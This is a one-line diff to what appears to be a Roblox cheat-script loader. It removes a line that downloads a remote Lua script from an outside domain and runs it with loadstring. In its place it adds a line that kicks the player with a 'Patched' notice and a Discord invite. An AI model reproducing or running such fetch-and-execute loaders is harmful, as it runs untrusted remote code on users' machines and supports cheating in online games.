@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://shattered-gang.lol/miscguntest.lua"))()
+return game.Players.LocalPlayer:Kick("\n Patched.\n Our Discord invite: mNadW6zUEz")
